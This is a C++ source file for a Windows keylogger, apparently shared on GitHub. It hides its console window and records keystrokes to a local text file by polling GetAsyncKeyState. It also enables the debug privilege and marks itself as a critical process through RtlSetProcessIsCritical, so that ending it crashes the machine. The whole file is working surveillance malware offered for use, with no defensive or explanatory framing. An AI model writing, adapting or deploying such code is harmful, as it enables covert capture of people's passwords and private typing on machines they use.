#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <thread>


/*
Create By Anas hd
Github : https://github.com/walczy


*/
using namespace std;

void flog(string g);

bool Otg(int key)
{
	switch (key) {
	case VK_SPACE:
		flog(" ");
		return true;
	case VK_RETURN:
		flog("[RETURN]");
		return true;
	case VK_CAPITAL:
		flog("[CAPS LOCK]");
	default:
		return false;
	}
}



typedef long(WINAPI* RtlSetProcessIsCritical)(
	IN BOOLEAN NewSettings,
	OUT BOOLEAN OldSettings,
	IN BOOLEAN CriticalStop
	);

BOOL SetPrivilege(BOOL bEnablePrivilege);

void Skinjbir() {
	RtlSetProcessIsCritical CallAPI;
	CallAPI = (RtlSetProcessIsCritical)GetProcAddress(LoadLibraryA("NTDLL.dll"), "RtlSetProcessIsCritical");

	if (SetPrivilege(TRUE) && CallAPI != NULL) {
		CallAPI(TRUE, FALSE, FALSE);
		std::cout << "Done Successfully :)";
	}
	system("pause");
}

BOOL SetPrivilege(BOOL bEnablePrivilege) {
	HANDLE Proc, hTocken;
	Proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	if (!OpenProcessToken(Proc, TOKEN_ALL_ACCESS, &hTocken)) return false;

	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))  return  FALSE;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	if (!AdjustTokenPrivileges(hTocken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
		return FALSE;

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) return FALSE;
	return TRUE;

}

int main()
{

	thread  skinjbire(Skinjbir);
	skinjbire.join();
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {

				fstream Keylogger;
				Keylogger.open("Keylogger.txt", fstream::app);
				if (Keylogger.is_open()) {
					Keylogger << char(KEY);
					Keylogger.close();
				}

			}
		}
	}
}

void flog(string g)
{
	fstream Keylogger;
	Keylogger.open("Keylogger.txt", fstream::app);
	if (Keylogger.is_open()) {
		Keylogger << g;
		Keylogger.close();
	}
}
